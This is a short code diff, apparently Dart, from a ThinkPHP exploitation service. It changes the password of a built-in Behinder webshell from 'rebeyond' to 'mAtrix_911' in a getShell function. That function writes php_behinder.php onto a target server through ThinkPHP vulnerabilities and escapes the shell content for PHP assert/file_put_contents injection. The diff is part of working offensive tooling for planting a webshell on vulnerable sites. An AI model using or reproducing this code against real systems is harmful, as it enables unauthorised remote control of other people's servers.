@@ -624,12 +624,12 @@ class ThinkphpExpService {
     }
   }
 
-  /// GetShell（写入 php_behinder.php，使用内置冰蝎马，密码 rebeyond）
+  /// GetShell（写入 php_behinder.php，使用内置冰蝎马，密码 mAtrix_911）
   /// [shellContent] 为 assets/defaults/payloads/php_behinder.php 的内容
   Future<String?> getShell(ThinkphpVulnType type, String shellContent) async {
     final mod = await _getModule();
     const shellFile = 'php_behinder.php';
-    const shellPass = 'rebeyond';
+    const shellPass = 'mAtrix_911';
 
     // 用于 assert/file_put_contents 的 PHP 字符串转义：' -> \', \ -> \\
     final shellForAssert = shellContent.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
